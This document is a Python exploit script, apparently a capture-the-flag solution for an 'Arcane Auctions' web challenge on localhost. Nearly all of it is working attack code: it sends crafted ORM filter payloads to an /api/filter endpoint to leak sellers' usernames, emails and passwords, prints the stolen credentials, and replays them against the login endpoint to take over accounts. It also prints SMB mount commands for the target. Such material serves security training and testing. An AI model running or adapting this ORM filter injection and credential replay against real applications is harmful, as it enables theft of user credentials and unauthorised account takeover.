#!/usr/bin/env python3
import requests
import sys
import json
import time
import re


def exploit_filter_endpoint(base_url):

    print("Exploiting vulnerable filter endpoint:")

    payloads = [
        {
            "filter": {
                "include": {
                    "seller": {
                        "select": {
                            "id": True,
                            "username": True,
                            "email": True,
                            "password": True,
                        }
                    }
                }
            }
        },
        {
            "filter": {
                "select": {
                    "id": True,
                    "name": True,
                    "seller": {
                        "select": {
                            "id": True,
                            "username": True,
                            "email": True,
                            "password": True,
                        }
                    },
                }
            }
        },
    ]

    all_credentials = []

    for i, payload in enumerate(payloads):
        print(f"Trying payload variation {i+1}")
        try:
            response = requests.post(f"{base_url}/api/filter", json=payload, timeout=10)

            if response.status_code == 200:
                data = response.json()
                print(f"Got response from payload {i+1}")

                credentials = extract_credentials(data)
                if credentials:
                    print(f"Found {len(credentials)} credentials with payload {i+1}")
                    all_credentials.extend(credentials)
                else:
                    print(f"No credentials found with payload {i+1}")
            else:
                print(f"Payload {i+1} failed with status code {response.status_code}")

            time.sleep(1)

        except Exception as e:
            print(f"Error with payload {i+1}: {str(e)}")

    unique_credentials = []
    seen_emails = set()

    for cred in all_credentials:
        email = cred.get("email")
        if email and email not in seen_emails:
            seen_emails.add(email)
            unique_credentials.append(cred)

    if unique_credentials:
        print(f"Found {len(unique_credentials)} unique credentials:")
        print("-" * 50)
        for cred in unique_credentials:
            print(f"Username: {cred.get('username')}")
            print(f"Email: {cred.get('email')}")
            print(f"Password: {cred.get('password')}")
            print("-" * 50)
    else:
        print("Failed to extract any credentials")

    return unique_credentials


def extract_credentials(data):
    credentials = []

    if isinstance(data, list):
        for item in data:
            if isinstance(item, dict) and "password" in item:
                credentials.append(
                    {
                        "username": item.get("username"),
                        "email": item.get("email"),
                        "password": item.get("password"),
                    }
                )

            if (
                isinstance(item, dict)
                and "seller" in item
                and isinstance(item["seller"], dict)
            ):
                seller = item["seller"]
                if "password" in seller:
                    credentials.append(
                        {
                            "username": seller.get("username"),
                            "email": seller.get("email"),
                            "password": seller.get("password"),
                        }
                    )

    return credentials


def login_with_credentials(base_url, credentials):
    print("Attempting to login with extracted credentials")

    for cred in credentials:
        email = cred.get("email")
        password = cred.get("password")

        if not email or not password:
            continue

        print(f"[*] Trying: {email} / {password}")

        payload = {"email": email, "password": password}

        try:
            print(f"Sending login request with email/password...")
            response = requests.post(f"{base_url}/login", json=payload, timeout=10)

            print(f"Login status code: {response.status_code}")
            if response.status_code == 200:
                print(f"Login response: {response.text}")

                if "success" in response.text.lower():
                    print(f"Successfully logged in as {email}!")
                    return response.cookies, cred

            payload = {"username": cred.get("username"), "password": password}
            print(f"Retrying with username/password:")
            response = requests.post(f"{base_url}/login", json=payload, timeout=10)

            print(f"Login status code: {response.status_code}")
            if response.status_code == 200:
                print(f"Login response: {response.text}")

                if "success" in response.text.lower():
                    print(f"Successfully logged in as {cred.get('username')}")
                    return response.cookies, cred
        except Exception as e:
            print(f"Error during login attempt: {str(e)}")

    return None, None


if __name__ == "__main__":
    print("=== Arcane Auctions Exploit ===")

    # Port assignments
    target_ip = "localhost"
    web_port = "80"  # Auction site web application
    smb_port = "445"  # SMB share for mounting
    checker_port = "1337"  # Checker port for flag verification

    print(f"Target Web App: {target_ip}:{web_port}")
    print(f"SMB Share Port: {target_ip}:{smb_port}")
    print(f"Checker Port: {target_ip}:{checker_port}")

    base_url = f"http://{target_ip}:{web_port}"

    print(f"mount -t cifs //{target_ip}/app ~/mnt/ -o username=guest,port={smb_port}")
    print(f"mount_smbfs //guest@{target_ip}:{smb_port}/app /Mount_Point")

    credentials = exploit_filter_endpoint(base_url)

    if credentials:
        cookies, successful_cred = login_with_credentials(base_url, credentials)

        if cookies:
            print("\nAuthentication successful! Vulnerability confirmed.")

        else:
            print("\nAuthentication failed, but credentials were extracted.")
    else:
        print("\nFailed to extract any credentials. Exploit may need adjustments.")
